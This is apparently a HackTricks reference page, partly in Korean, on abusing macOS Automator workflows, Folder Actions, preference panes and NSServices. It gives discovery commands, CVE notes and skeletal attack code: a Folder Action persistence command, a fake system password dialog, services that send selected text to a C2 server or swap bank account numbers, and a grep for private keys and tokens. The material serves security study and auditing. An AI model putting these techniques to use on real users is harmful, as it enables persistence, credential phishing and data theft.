# macOS Automator, Preference Panes & NSServices Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions & Workflows

### 기본 정보

**Automator**는 macOS의 visual automation tool입니다. **actions** (`.action` bundles)로 구성된 **workflows** (`.workflow` bundles)를 실행합니다. Automator는 **Folder Actions**, **Quick Actions**, **Shortcuts** integration에도 사용됩니다. 최신 macOS에서는 workflows를 **Shortcuts**로 **import**할 수도 있으므로, 동일한 malicious logic이 Finder Quick Action, `~/Library/Services/` 아래의 user service 또는 legacy Automator actions를 기반으로 하는 shortcut으로 나타날 수 있습니다.

Automator actions는 workflow가 실행될 때 Automator runtime에 로드되는 **plugins**입니다. 다음 작업을 수행할 수 있습니다:
- 임의의 shell scripts 실행
- files 및 data 처리
- AppleScript를 통해 applications와 상호작용
- 복잡한 automation을 위해 서로 연결

### 중요한 이유

> [!WARNING]
> Automator workflows는 **social-engineering**을 통해 실행되도록 유도할 수 있으며, 단순한 document files처럼 보입니다. `.workflow` bundle에는 workflow 실행 시 실행되는 embedded shell commands가 포함될 수 있습니다. Folder Actions와 결합하면 file events를 트리거로 하는 **automatic persistence**를 제공할 수 있습니다. 최근 Gatekeeper fixes는 **app-bundled Quick Actions** (`Contents/PlugIns/*.workflow`)을 무해한 data가 아니라 executable content로 취급해야 한다는 점도 보여주었습니다.

### Discovery
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### 공격: Social-Engineered Workflow

`.workflow` 번들은 대부분의 사용자에게 일반적인 문서 파일처럼 보입니다:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Attack: Folder Action Persistence

Folder Actions는 모니터링되는 폴더에 파일이 추가될 때 자동으로 workflow를 실행합니다:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions는 재부팅 후에도 지속되며 조용히 실행됩니다. `~/Downloads`에 Folder Action을 설정하면 **다운로드된 모든 파일이 payload를 트리거합니다** — Safari, Chrome, AirDrop, 이메일 첨부 파일에서 받은 파일을 포함합니다. 또한 `System Events`는 기본 `~/Library/Scripts/Folder Action Scripts` 위치 외부의 스크립트를 가리키는 Folder Actions도 등록할 수 있으므로, 느슨한 경로 탐색도 수행할 가치가 있습니다. 관련 TCC 영향은 [TCC page](../macos-security-protections/macos-tcc/README.md)를 참고하세요.

---

## Preference Panes

### 기본 정보

Preference panes(`.prefPane` bundles)는 **System Settings**(이전 명칭: System Preferences)에서 로드되는 plugins입니다. 시스템 또는 third-party 기능을 위한 configuration UI panel을 제공합니다. 이전 시스템에서는 `System Preferences`가 직접 로드했지만, 최신 release에서는 third-party panes가 일반적으로 System Settings에서 시작된 **legacy loader XPC service**에 의해 중개됩니다.

### 중요한 이유

- Preference panes는 System Settings / System Preferences가 생성한 **trusted host process**에서 실행됩니다.
- 최신 시스템에서 해당 host는 **`legacyLoader` XPC service**일 수 있으므로, 중요한 경계는 여전히 **trusted Apple UI process -> third-party code loading**입니다.
- Third-party preference panes는 **host process security context**와 해당 UI에 연결된 user trust를 상속합니다.
- 사용자는 Preference panes를 **더블 클릭**하여 설치합니다 — social engineering에 취약합니다.
- 설치되면 **지속성을 유지하며**, System Settings가 해당 panel을 열 때마다 로드됩니다.

### Discovery
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Attack: Privilege Context Hijacking

악성 preference pane은 **pane host**의 security context를 상속합니다(역사적으로는 `System Preferences`였으며, 최신 버전에서는 대개 `System Settings`가 실행하는 `legacyLoader` helper입니다):
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside the preference-pane host process
// It inherits that host's permissions / trust relationship

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Attack: 설치를 통한 Persistence
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Attack: UI Phishing

Preference pane은 정상적인 system UI panel을 모방하여 **credentials를 phish**할 수 있습니다:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### 기본 정보

**NSServices**를 사용하면 애플리케이션이 **Services menu**(오른쪽 클릭 → Services)를 통해 다른 앱에 기능을 제공할 수 있습니다. 사용자가 텍스트나 데이터를 선택하고 service를 실행하면, 선택한 데이터는 처리를 위해 **service provider로 전송**됩니다.

Services는 애플리케이션의 `Info.plist`에서 `NSServices` 키 아래에 선언되며, pasteboard server(`pbs`)에 등록됩니다. macOS는 어떤 Services가 표시되는지와 sandboxed caller에 추가 경고를 표시할지 결정하는 **service cache** 및 **restriction policy**도 유지합니다.

### 중요한 이유

- Services는 **애플리케이션 간 데이터 흐름**을 수신합니다. 모든 애플리케이션에서 선택한 텍스트가 service로 전송됩니다.
- 악성 service는 password manager, email client, financial app의 데이터를 캡처할 수 있습니다.
- Services는 **수정된 데이터를 호출 애플리케이션으로 반환**할 수 있습니다(selection 작업에 대한 man-in-the-middle).
- Service 이름을 "Format Text", "Encrypt Selection", "Share"처럼 정상적인 것으로 보이도록 만들 수 있습니다.
- 선택 사항인 `NSRestricted` flag는 security와 관련이 있습니다. unrestricted로 표시된 service는 sandboxed app에서 호출될 때, macOS가 escape-prone service에 표시하는 경고 없이 실행될 수 있습니다<sup>[[2]](#references)</sup>

### Discovery
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Attack: Data Interception Service
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Attack: Data Modification (Man-in-the-Middle)

서비스는 합법적인 기능을 제공하는 것처럼 보이면서 **반환되는 데이터를 수정**할 수 있습니다:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
### Restricted Services & Modern Abuse

Apple은 각 service definition에 선택적 `NSRestricted` boolean을 지원합니다. 이 값이 설정되어 있으면 해당 service가 sandbox 또는 privacy boundary를 **탈출**하는 데 도움을 줄 수 있으므로 macOS는 sandboxed caller에게 경고합니다. 공격 관점에서는 다음 두 가지 유용한 audit 경로가 있습니다.

- Apple Events, file access 또는 기타 privileged action을 proxy하는데도 **restricted로 표시되지 않은 third-party service**를 찾습니다.
- 강력한 entitlement를 가진 **high-value built-in service**(예: Script Editor 또는 Finder-backed helper가 노출하는 service)를 찾고, user interaction만으로 이를 data-access primitive로 전환할 수 있는지 확인합니다.

최근의 좋은 예는 **CVE-2022-48574**입니다. Services mechanism을 악용하여 **예상된 confirmation flow 없이 TCC-protected user file에 접근**할 수 있었습니다. 이 bug는 수정되었지만, 이 technique는 threat modeling에 여전히 유용합니다. caller를 대신하여 file access 또는 automation request를 전달하는 모든 service는 동일한 수준으로 검토해야 합니다.<sup>[[2]](#references)</sup>

---

## Recent Security Notes

- **Quick Actions는 executable content입니다**: Apple은 2024년에 app-bundled Automator Quick Action이 일반적인 assessment 없이 실행될 수 있었던 Gatekeeper bypass를 수정했습니다. app을 audit할 때는 `Contents/PlugIns/*.workflow/Contents/document.wflow`를 helper script 또는 login item을 검사하는 것과 동일하게 검사해야 합니다. See [the Gatekeeper page](../macos-security-protections/macos-gatekeeper.md).<sup>[[1]](#references)</sup>
- **Shortcuts는 legacy Automator behavior를 상속할 수 있습니다**: Apple은 third-party shortcut이 **legacy Automator action**을 사용하여 예상된 permission flow 없이 Apple Events를 전송하는 사례가 발견된 후 추가적인 user-consent prompt도 추가했습니다. Imported workflow와 shortcut bundle에서 `Run AppleScript`, `Run Shell Script` 및 이와 유사한 bridge action을 검토해야 합니다. See [the TCC page](../macos-security-protections/macos-tcc/README.md).<sup>[[3]](#references)</sup>
- **Automator는 여전히 활성 상태인 privacy boundary입니다**: Apple은 protected user data에 접근할 수 있었던 또 다른 Automator 문제를 2025년에 수정했습니다. Automator가 legacy surface라 하더라도 모든 workflow runner, Quick Action host 또는 automation bridge를 dead code가 아닌 현재의 attack surface로 취급해야 합니다.<sup>[[4]](#references)</sup>

---

## Cross-Technique Attack Chains

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### 환경설정 패널 → TCC 권한 상승
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```
### NSService → Password Manager 탈취
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## 참고 자료

- [1] [Apple - macOS Ventura 13.7, Sonoma 14.7 및 Sequoia 15의 보안 콘텐츠 정보](https://support.apple.com/en-us/121238)
- [2] [Moonlock - macOS에서 NSServices exploit이 작동한 방식](https://moonlock.com/nsservices-macos)
- [3] [Apple - macOS Sonoma 14.6의 보안 콘텐츠 정보(CVE-2024-40834)](https://support.apple.com/en-us/120911)
- [4] [Apple - macOS Sequoia 15.4의 보안 콘텐츠 정보(CVE-2025-30460)](https://support.apple.com/en-us/122373)

{{#include ../../../banners/hacktricks-training.md}}
